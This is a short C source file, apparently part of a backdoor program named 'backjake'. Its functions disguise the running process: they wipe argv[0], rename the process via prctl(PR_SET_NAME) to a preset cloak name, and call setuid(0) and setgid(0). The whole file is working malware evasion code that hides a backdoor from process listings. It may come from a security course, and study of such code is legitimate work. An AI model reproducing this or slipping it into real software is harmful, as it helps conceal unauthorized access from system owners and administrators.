#include "backjake.h"

/*------------------------------------------------------------------------------
--
--  FUNCTION:   disguise
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void disguise(char ** argv)
--                      argv - the programs arguments
--
--  RETURNS:    void
--
--  NOTES:      gets and sets the new disguise for the program
--  
------------------------------------------------------------------------------*/
void disguise(char ** argv)
{
	setDisguise(getDisguise(), argv);
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   getDisguise
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  char* getDisguise()
--
--  RETURNS:    char *  - the new name of the program
--
--  NOTES:      get a name for the program to disguise itself with
--  
------------------------------------------------------------------------------*/
char* getDisguise()
{
	char* cloak = CLOAK;
	return cloak;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   setDisguise
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  setDisguise(char * cloak, char ** argv)
--                      cloak - the new program name
--						argv  - the programs arguments 
--
--  RETURNS:    void
--
--  NOTES:      sets the name of the program
--  
------------------------------------------------------------------------------*/
void setDisguise(char * cloak, char ** argv)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], cloak);
	prctl(PR_SET_NAME, cloak, 0, 0);

	setuid(0);
	setgid(0);
}